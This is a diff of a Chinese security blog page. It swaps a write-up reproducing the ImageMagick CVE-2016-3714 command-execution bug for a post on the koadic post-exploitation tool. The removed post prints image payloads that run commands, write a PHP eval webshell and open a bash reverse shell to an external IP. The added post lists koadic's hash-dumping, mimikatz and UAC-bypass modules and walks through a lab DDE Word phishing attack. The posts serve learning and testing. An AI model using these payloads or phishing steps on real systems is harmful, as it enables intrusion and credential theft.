@@ -89,7 +89,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="漏洞复现," />
+  <meta name="keywords" content="渗透," />
 
 
 
@@ -105,23 +105,26 @@
 
 
 
-<meta name="description" content="第一次真正意义上的复现漏洞，花费了很多时间在漏洞平台的搭建上，在实验室大佬的提示下，自己的kali虚拟机上有convert也就是ImageMagick，然后。。。算了进入正题。 ImageMagick简介ImageMagick是一个免费的创建、编辑、合成图片的软件。它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片">
-<meta name="keywords" content="漏洞复现">
+<meta name="description" content="文章起因作为一个最近在学习js远控的萌新，在学习beef过程中碰到了许多问题，然后就请教在做ctf认识的小伙伴，小伙伴推荐了“大宝剑”koadic，在接触koadic之后，发现这东西真是一个对萌新特别友好的神器。本着分享即学习的原则，我就把我最近玩koadic的新的想法写成一篇文章，如果文章有任何不准确的地方，请各位大佬斧正。">
+<meta name="keywords" content="渗透">
 <meta property="og:type" content="article">
-<meta property="og:title" content="ImageMagick远程命令执行（CVE-2016-3714）复现与理解">
-<meta property="og:url" content="http://whc.dropsec.xyz/2017/05/23/ImageMagick远程命令执行（CVE-2016-3714）复现与理解/index.html">
+<meta property="og:title" content="关于后渗透利器koadic的一些思考">
+<meta property="og:url" content="http://whc.dropsec.xyz/2017/11/23/关于后渗透利器koadic的一些思考/index.html">
 <meta property="og:site_name" content="Ha1g0的窝">
-<meta property="og:description" content="第一次真正意义上的复现漏洞，花费了很多时间在漏洞平台的搭建上，在实验室大佬的提示下，自己的kali虚拟机上有convert也就是ImageMagick，然后。。。算了进入正题。 ImageMagick简介ImageMagick是一个免费的创建、编辑、合成图片的软件。它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片">
+<meta property="og:description" content="文章起因作为一个最近在学习js远控的萌新，在学习beef过程中碰到了许多问题，然后就请教在做ctf认识的小伙伴，小伙伴推荐了“大宝剑”koadic，在接触koadic之后，发现这东西真是一个对萌新特别友好的神器。本着分享即学习的原则，我就把我最近玩koadic的新的想法写成一篇文章，如果文章有任何不准确的地方，请各位大佬斧正。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://ooo.0o0.ooo/2017/06/15/594241ab2afa6.png">
-<meta property="og:image" content="https://ooo.0o0.ooo/2017/06/15/5942412545a48.png">
-<meta property="og:image" content="https://ooo.0o0.ooo/2017/06/15/594241c20bb35.png">
-<meta property="og:image" content="https://ooo.0o0.ooo/2017/06/15/594241efd3861.png">
-<meta property="og:updated_time" content="2017-06-16T04:26:14.574Z">
+<meta property="og:image" content="http://oohnuejim.bkt.clouddn.com/dde.png">
+<meta property="og:image" content="http://oohnuejim.bkt.clouddn.com/%E5%8F%8D%E5%BC%B92.png">
+<meta property="og:image" content="http://oohnuejim.bkt.clouddn.com/%E6%8F%90%E6%9D%83.png">
+<meta property="og:image" content="http://oohnuejim.bkt.clouddn.com/tcp%E6%89%AB%E6%8F%8F.png">
+<meta property="og:image" content="http://oohnuejim.bkt.clouddn.com/tcp%E6%89%AB%E6%8F%8F2.png">
+<meta property="og:image" content="http://oohnuejim.bkt.clouddn.com/%E4%B8%8A%E4%BC%A02.png">
+<meta property="og:image" content="http://oohnuejim.bkt.clouddn.com/%E4%B8%8A%E4%BC%A0.png">
+<meta property="og:updated_time" content="2017-12-01T13:41:34.978Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="ImageMagick远程命令执行（CVE-2016-3714）复现与理解">
-<meta name="twitter:description" content="第一次真正意义上的复现漏洞，花费了很多时间在漏洞平台的搭建上，在实验室大佬的提示下，自己的kali虚拟机上有convert也就是ImageMagick，然后。。。算了进入正题。 ImageMagick简介ImageMagick是一个免费的创建、编辑、合成图片的软件。它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片">
-<meta name="twitter:image" content="https://ooo.0o0.ooo/2017/06/15/594241ab2afa6.png">
+<meta name="twitter:title" content="关于后渗透利器koadic的一些思考">
+<meta name="twitter:description" content="文章起因作为一个最近在学习js远控的萌新，在学习beef过程中碰到了许多问题，然后就请教在做ctf认识的小伙伴，小伙伴推荐了“大宝剑”koadic，在接触koadic之后，发现这东西真是一个对萌新特别友好的神器。本着分享即学习的原则，我就把我最近玩koadic的新的想法写成一篇文章，如果文章有任何不准确的地方，请各位大佬斧正。">
+<meta name="twitter:image" content="http://oohnuejim.bkt.clouddn.com/dde.png">
 
 
 
@@ -149,13 +152,13 @@
 
 
 
-  <link rel="canonical" href="http://whc.dropsec.xyz/2017/05/23/ImageMagick远程命令执行（CVE-2016-3714）复现与理解/"/>
+  <link rel="canonical" href="http://whc.dropsec.xyz/2017/11/23/关于后渗透利器koadic的一些思考/"/>
 
 
 
 
 
-  <title> ImageMagick远程命令执行（CVE-2016-3714）复现与理解 | Ha1g0的窝 </title>
+  <title> 关于后渗透利器koadic的一些思考 | Ha1g0的窝 </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -294,7 +297,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://whc.dropsec.xyz/2017/05/23/ImageMagick远程命令执行（CVE-2016-3714）复现与理解/">
+    <link itemprop="mainEntityOfPage" href="http://whc.dropsec.xyz/2017/11/23/关于后渗透利器koadic的一些思考/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Ha1g0">
@@ -315,7 +318,7 @@
             
             
               
-                ImageMagick远程命令执行（CVE-2016-3714）复现与理解
+                关于后渗透利器koadic的一些思考
               
             
           </h1>
@@ -330,8 +333,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-05-23T15:56:41+08:00">
-                2017-05-23
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-11-23T16:21:34+08:00">
+                2017-11-23
               </time>
             
 
@@ -340,28 +343,6 @@
             
           </span>
 
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/漏洞/" itemprop="url" rel="index">
-                    <span itemprop="name">漏洞</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
           
 
           
@@ -388,62 +369,131 @@
       
 
       
-        <p>第一次真正意义上的复现漏洞，花费了很多时间在漏洞平台的搭建上，在实验室大佬的提示下，自己的kali虚拟机上有convert也就是ImageMagick，然后。。。算了进入正题。</p>
-<h3 id="ImageMagick简介"><a href="#ImageMagick简介" class="headerlink" title="ImageMagick简介"></a>ImageMagick简介</h3><p>ImageMagick是一个免费的创建、编辑、合成图片的软件。它可以读取、转换、写入多种格式的图片。图片切割、颜色替换、各种效果的应用，图片的旋转、组合，文本，直线，多边形，椭圆，曲线，附加到图片伸展旋转。<br>这里是ImageMagick在Linux的convert的 应用<a href="http://www.cnblogs.com/ITtangtang/p/3951240.html" target="_blank" rel="external">http://www.cnblogs.com/ITtangtang/p/3951240.html</a></p>
-<a id="more"></a>
-<h3 id="参考资料："><a href="#参考资料：" class="headerlink" title="参考资料："></a>参考资料：</h3><p>初心师傅wp<br><a href="https://ricterz.me/posts/Write%20Up:%20Remote%20Command%20Execute%20in%20Wordpress%204.5.1" target="_blank" rel="external">https://ricterz.me/posts/Write%20Up:%20Remote%20Command%20Execute%20in%20Wordpress%204.5.1</a><br>实验室大佬Isron：<br><a href="http://isron.cn/2017/03/29/CVE-2016-3714/" target="_blank" rel="external">http://isron.cn/2017/03/29/CVE-2016-3714/</a><br>Rcoll大佬：<br><a href="http://rcoil.me/2017/03/CVE-2016-3714/" target="_blank" rel="external">http://rcoil.me/2017/03/CVE-2016-3714/</a><br>Freebuf：<br><a href="http://www.freebuf.com/vuls/104048.html" target="_blank" rel="external">http://www.freebuf.com/vuls/104048.html</a><br>推酷：<br><a href="http://www.tuicool.com/articles/InE7z2e" target="_blank" rel="external">http://www.tuicool.com/articles/InE7z2e</a></p>
-<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>在ImageMagick解析图片时，如果图片的地址是<code>https://</code>开头的，就调用InvokeDelegate，执行MagickCore/delegate.c的<a href="https://github.com/ImageMagick/ImageMagick/blob/e93e339c0a44cec16c08d78241f7aa3754485004/MagickCore/delegate.c#L407" target="_blank" rel="external">407</a>行<br>的一条命令<br><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">&lt;delegate decode=\<span class="string">"https\" command=\"&amp;quot;wget&amp;quot; -q -O &amp;quot;%o&amp;quot; &amp;quot;https:%M&amp;quot;\"/&gt;</span></div><div class="line"><span class="string">（&amp;quot是html的 "</span>）`</div></pre></td></tr></table></figure></p>
-<p>具体的代码执行，函数的调用过程在这篇文章上面（<a href="http://www.freebuf.com/vuls/104048.html" target="_blank" rel="external">http://www.freebuf.com/vuls/104048.html</a> ）<br>（PS：我看网上有几篇文章说的执行的是curl命令，在 /etc/ImageMagick/delegates.xml 文件中，内容如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ImageMagick cat /etc/ImageMagick/delegates.xml | grep https &lt;delegate decode=&quot;https&quot; command=&quot;&quot;curl&quot; -s -k -o &quot;%o&quot; &quot;https:%M&quot;&quot;/&gt;`）</div></pre></td></tr></table></figure></p>
-<p>而其中的%o和%M定义如下:</p>
-<blockquote>
-<p> %i  input image filename<br> %o  output image filename<br> %u  unique temporary filename<br> %Z  unique temporary filename<br> %#  input image signature<br> %b  image file size<br> %c  input image comment<br> %g  image geometry<br> %h  image rows (height)<br> %k  input image number colors<br> %l  image label<br> %m  input image format<br> %p  page number<br> %q  input image depth<br> %s  scene number<br> %w  image columns (width)<br> %x  input image x resolution<br> %y  input image y resolution</p>
-</blockquote>
-<p>执行的命令就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;wget&quot; -q -O  &quot;%o&quot; &quot;https:%M&quot;</div></pre></td></tr></table></figure></p>
-<p>还有一个版本是curl的，2个命令的作用都是从网络上获取文件。<br>这个代码本意是从网络上这个地址获取这个图片，</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;wget&quot; -q -O  &quot;1.png&quot; &quot;https://ss0.bdstatic.com/5aV1bjqh_Q23odCf/static/superman/img/logo/logo_white_fe6da1ec.png&quot;</div></pre></td></tr></table></figure>
-<p><img src="https://ooo.0o0.ooo/2017/06/15/594241ab2afa6.png" alt=""><br>ImageMagick官方补丁就是在%M这个地方加了个过滤函数，过滤关键字。</p>
-<h3 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h3><blockquote>
-<p>push graphic-context<br>viewbox 0 0 640 480<br>fill ‘url(<a href="https://example.com/image.jpg&quot;|id" target="_blank" rel="external">https://example.com/image.jpg&quot;|id</a>“)’<br>pop graphic-context</p>
-</blockquote>
+        <h2 id="文章起因"><a href="#文章起因" class="headerlink" title="文章起因"></a>文章起因</h2><p>作为一个最近在学习js远控的萌新，在学习beef过程中碰到了许多问题，然后就请教在做ctf认识的小伙伴，小伙伴推荐了“大宝剑”koadic，在接触koadic之后，发现这东西真是一个对萌新特别友好的神器。本着分享即学习的原则，我就把我最近玩koadic的新的想法写成一篇文章，如果文章有任何不准确的地方，请各位大佬斧正。<br><a id="more"></a></p>
+<h2 id="Koadic的基础用法"><a href="#Koadic的基础用法" class="headerlink" title="Koadic的基础用法"></a>Koadic的基础用法</h2><p>前期准备</p>
+<pre><code># git clone https://github.com/zerosum0x0/koadic.git
+# cd koadic
+# pip install -r requirements.txt
+</code></pre><p>准备完成之后，基本的操作在参考文章的第一篇已经有所介绍，我就不再累述。koadic根据作者在github上的介绍，主要分为这么2个模块  </p>
 <ul>
-<li>push和pop是用于堆栈的操作，一个进栈，一个出栈;</li>
-<li>viewbox是表示SVG可见区域的大小，或者可以想象成舞台大小，画布大小。简单理解就是根据后面得参数选取其中得一部分画面;</li>
-<li>fill url()是把图片填充到获取图片地址的元素内;</li>
+<li><strong>Stagers</strong>  </li>
 </ul>
-<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><p>测试环境kali2016<br>imagemagick版本为6.8.9-9，在漏洞影响范围内<br>新建一个空的exploit.png，用vi写入poc</p>
-<blockquote>
-<p>push graphic-context<br>viewbox 0 0 640 480<br>fill ‘url(<a href="https://example.com/image.jpg&quot;|ls" target="_blank" rel="external">https://example.com/image.jpg&quot;|ls</a> -al”)’<br>pop graphic-context</p>
-</blockquote>
-<p>直接使用convert命令<br><img src="https://ooo.0o0.ooo/2017/06/15/5942412545a48.png" alt=""><br>可以明确地看到执行了ls -al命令，如果在web应用上，直接上传一个类似的图片，可以直接执行任何命令。</p>
-<p>我这偷懒了，直接在本地有漏洞版本的虚拟机上验证了，没有搭建web服务。<br>最近也在学docker，然后看到p牛的项目Vulapp上有搭建好的环境，拉下来直接用（最近实验室网不太好，3-400M的东西不好下）。</p>
-<blockquote>
-<p>获取镜像<br>docker pull medicean/vulapps:i_imagemagick_1<br>运行镜像<br>docker run -d -p 8000:80 –name=i_imagemagick_1<br>medicean/vulapps:i_imagemagick_1<br>进入交互式shell<br>docker run -t -i medicean/vulapps:i_imagemagick_1 “/bin/bash”  </p>
-</blockquote>
-<p>这个镜像里面，该有的都有了<br><img src="https://ooo.0o0.ooo/2017/06/15/594241c20bb35.png" alt=""><br>执行命令</p>
-<blockquote>
-<p>docker exec i_imagemagick_1 convert /poc.png 1.png</p>
-</blockquote>
-<p><img src="https://ooo.0o0.ooo/2017/06/15/594241efd3861.png" alt=""></p>
-<p>效果跟上面一样</p>
-<h3 id="漏洞运用方式"><a href="#漏洞运用方式" class="headerlink" title="漏洞运用方式"></a>漏洞运用方式</h3><ul>
-<li>命令执行：</li>
+<table>
+<thead>
+<tr>
+<th>Module</th>
+<th style="text-align:center">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>stager/js/mshta</td>
+<td style="text-align:center">serves payloads in memory using MSHTA.exe HTML Applications</td>
+</tr>
+<tr>
+<td>stager/js/regsvr</td>
+<td style="text-align:center">serves payloads in memory using regsvr32.exe COM+ scriptlets</td>
+</tr>
+<tr>
+<td>stager/js/rundll32_js</td>
+<td style="text-align:center">serves payloads in memory using rundll32.exe</td>
+</tr>
+<tr>
+<td>stager/js/disk</td>
+<td style="text-align:center">serves payloads using files on disk</td>
+</tr>
+</tbody>
+</table>
+<p>stagers是在你攻击机上生成的payload的种类</p>
+<ul>
+<li><strong>Implants</strong></li>
 </ul>
-<blockquote>
-<p>push graphic-context<br>viewbox 0 0 640 480<br>fill ‘url(<a href="https://example.com/image.jpg&quot;|ls" target="_blank" rel="external">https://example.com/image.jpg&quot;|ls</a> -al”)’<br>pop graphic-context</p>
-</blockquote>
-<p>可以直接在里面写入webshell：</p>
-<blockquote>
-<p>push graphic-context<br>viewbox 0 0 640 480<br>fill ‘url(<a href="https://example.com/1.jpg&quot;|echo" target="_blank" rel="external">https://example.com/1.jpg&quot;|echo</a> \‘&lt;?php eval($_POST[\‘Isron\‘]);?&gt;\‘ shell.php”)’<br>pop graphic-context</p>
-</blockquote>
-<p>也可以反弹shell：</p>
-<blockquote>
-<p>push graphic-context<br>viewbox 0 0 640 480<br>fill ‘url(<a href="https://example.com/image.jpg&quot;|bash" target="_blank" rel="external">https://example.com/image.jpg&quot;|bash</a> -i &gt;&amp; /dev/tcp/外网服务器ip/12340 0&gt;&amp;1”)’<br>pop graphic-context</p>
-</blockquote>
-<p>这个反弹shell命令原理</p>
-<blockquote>
-<p>bash -i &gt;&amp; /dev/tcp/外网服务器ip/12340 0&gt;&amp;1  </p>
-</blockquote>
-<p>实验室大大大佬发了一篇<a href="http://byd.dropsec.xyz/2017/04/12/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B9%8B%E5%8F%8D%E5%BC%B9shell%E5%91%BD%E4%BB%A4%E5%88%86%E6%9E%90/" target="_blank" rel="external">文章</a>，让我茅塞顿开。</p>
+<table>
+<thead>
+<tr>
+<th>Module</th>
+<th style="text-align:center">Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>implant/elevate/bypassuac_eventvwr</td>
+<td style="text-align:center">Uses enigma0x3’s eventvwr.exe exploit to bypass UAC on Windows 7, 8, and 10.</td>
+</tr>
+<tr>
+<td>implant/elevate/bypassuac_sdclt</td>
+<td style="text-align:center">Uses enigma0x3’s sdclt.exe exploit to bypass UAC on Windows 10.</td>
+</tr>
+<tr>
+<td>implant/fun/zombie</td>
+<td style="text-align:center">Maxes volume and opens The Cranberries YouTube in a hidden window.</td>
+</tr>
+<tr>
+<td>implant/fun/voice</td>
+<td style="text-align:center">Plays a message over text-to-speech.</td>
+</tr>
+<tr>
+<td>implant/gather/clipboard</td>
+<td style="text-align:center">Plays a message over text-to-speech.</td>
+</tr>
+<tr>
+<td>implant/gather/hashdump_sam</td>
+<td style="text-align:center">Retrieves hashed passwords from the SAM hive.</td>
+</tr>
+<tr>
+<td>implant/gather/hashdump_dc</td>
+<td style="text-align:center">Domain controller hashes from the NTDS.dit file.</td>
+</tr>
+<tr>
+<td>implant/inject/mimikatz_dotnet2js</td>
+<td style="text-align:center">Injects a reflective-loaded DLL to run powerkatz.dll (@tirannido DotNetToJS).</td>
+</tr>
+<tr>
+<td>implant/inject/shellcode_excel</td>
+<td style="text-align:center">Runs arbitrary shellcode payload (if Excel is installed).</td>
+</tr>
+<tr>
+<td>implant/manage/enable_rdesktop</td>
+<td style="text-align:center">Enables remote desktop on the target.</td>
+</tr>
+<tr>
+<td>implant/manage/exec_cmd</td>
+<td style="text-align:center">Run an arbitrary command on the target, and optionally receive the output.</td>
+</tr>
+<tr>
+<td>implant/pivot/stage_wmi</td>
+<td style="text-align:center">Hook a zombie on another machine using WMI.</td>
+</tr>
+<tr>
+<td>implant/pivot/exec_psexec</td>
+<td style="text-align:center">Run a command on another machine using psexec from sysinternals.</td>
+</tr>
+<tr>
+<td>implant/scan/tcp</td>
+<td style="text-align:center">Uses HTTP to scan open TCP ports on the target zombie LAN.</td>
+</tr>
+<tr>
+<td>implant/utils/download_file</td>
+<td style="text-align:center">Downloads a file from the target zombie.</td>
+</tr>
+<tr>
+<td>implant/utils/upload_file</td>
+<td style="text-align:center">Uploads a file from the listening server to the target zombies.</td>
+</tr>
+</tbody>
+</table>
+<p>implant是在koadic能执行的操作，想命令执行exec_cmd，上传下载文件download_file，upload_file，抓hash  hashdump_sam和hashdump_dc等等。</p>
+<p>但是有几点补充：<br>我在本机测试的时候<br>1.用python2运行，会出现UnicodeDecodeError：ascii的错误，第一篇文章里面有了<a href="http://blog.csdn.net/qq_20125305/article/details/44562901" target="_blank" rel="external">解决方案</a><br>2.在更新过微软的补丁，bypassuac_eventvwr 和/bypassuac_sdclt win10提权均不成功，所以抓hash的一些操作不了。<br>3.在implant/fun 模块下 voice操作全部成功，但是cranberry出现AttributeError: ‘ThunderstruckImplant’ object has no attribute ‘load_script’错误，跟了一遍代码，发现不了问题，而且github上面也没有issue，很苦恼，各位大佬看出问题，可以联系小弟。</p>
+<h2 id="结合office的DDE命令执行来钓鱼"><a href="#结合office的DDE命令执行来钓鱼" class="headerlink" title="结合office的DDE命令执行来钓鱼"></a>结合office的DDE命令执行来钓鱼</h2><p>实验环境：<br>攻击机  kali（192.168.189.137）<br>靶机    win7家庭版 （192.168.189.139）</p>
+<p>参考第二篇参考文章，利用dde做一个带有恶意命令的word</p>
+<p><img src="http://oohnuejim.bkt.clouddn.com/dde.png" alt=""></p>
+<p>诱导靶机用户点击这个word，并且允许进行外部链接引用，当用户点击点击链接，我们攻击已经生成了一个session</p>
+<p><img src="http://oohnuejim.bkt.clouddn.com/%E5%8F%8D%E5%BC%B92.png" alt=""></p>
+<p>我们可以使用 bypassuac_evenvwr提权，提完权可以进行其他骚骚的操作<br><img src="http://oohnuejim.bkt.clouddn.com/%E6%8F%90%E6%9D%83.png" alt=""></p>
+<p>扫描tcp端口<br><img src="http://oohnuejim.bkt.clouddn.com/tcp%E6%89%AB%E6%8F%8F.png" alt=""><br>也可以进行内网扫描（偷了个懒，扫了kaili，kali是扫不到的）<br><img src="http://oohnuejim.bkt.clouddn.com/tcp%E6%89%AB%E6%8F%8F2.png" alt=""></p>
+<p>也可以上传文件（这个我在win10上成功了，win7上没成功）<br><img src="http://oohnuejim.bkt.clouddn.com/%E4%B8%8A%E4%BC%A02.png" alt=""><br><img src="http://oohnuejim.bkt.clouddn.com/%E4%B8%8A%E4%BC%A0.png" alt=""></p>
+<p>功能还是挺强大的</p>
+<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://www.freebuf.com/sectool/145674.html" target="_blank" rel="external">http://www.freebuf.com/sectool/145674.html</a><br><a href="http://www.freebuf.com/articles/terminal/150285.html" target="_blank" rel="external">http://www.freebuf.com/articles/terminal/150285.html</a></p>
 
       
     </div>
@@ -494,7 +544,7 @@
       
         <div class="post-tags">
           
-            <a href="/tags/漏洞复现/" rel="tag"><i class="fa fa-tag"></i> 漏洞复现</a>
+            <a href="/tags/渗透/" rel="tag"><i class="fa fa-tag"></i> 渗透</a>
           
         </div>
       
@@ -507,8 +557,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/05/10/CTF中Openssl常用命令/" rel="next" title="CTF中Openssl常用命令">
-                <i class="fa fa-chevron-left"></i> CTF中Openssl常用命令
+              <a href="/2017/08/10/关于Linux提权的思考/" rel="next" title="关于Liunx提权的思考">
+                <i class="fa fa-chevron-left"></i> 关于Liunx提权的思考
               </a>
             
           </div>
@@ -517,8 +567,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2017/05/29/ISCC2017部分题WriteUp/" rel="prev" title="ISCC2017部分题WriteUp">
-                ISCC2017部分题WriteUp <i class="fa fa-chevron-right"></i>
+              <a href="/2017/12/01/SQL注入进阶思考/" rel="prev" title="SQL注入进阶">
+                SQL注入进阶 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -689,7 +739,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#ImageMagick简介"><span class="nav-number">1.</span> <span class="nav-text">ImageMagick简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参考资料："><span class="nav-number">2.</span> <span class="nav-text">参考资料：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞原理"><span class="nav-number">3.</span> <span class="nav-text">漏洞原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#POC"><span class="nav-number">4.</span> <span class="nav-text">POC</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#验证"><span class="nav-number">5.</span> <span class="nav-text">验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞运用方式"><span class="nav-number">6.</span> <span class="nav-text">漏洞运用方式</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#文章起因"><span class="nav-number">1.</span> <span class="nav-text">文章起因</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Koadic的基础用法"><span class="nav-number">2.</span> <span class="nav-text">Koadic的基础用法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#结合office的DDE命令执行来钓鱼"><span class="nav-number">3.</span> <span class="nav-text">结合office的DDE命令执行来钓鱼</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考文章"><span class="nav-number">4.</span> <span class="nav-text">参考文章</span></a></li></ol></div>
             
 
           </div>
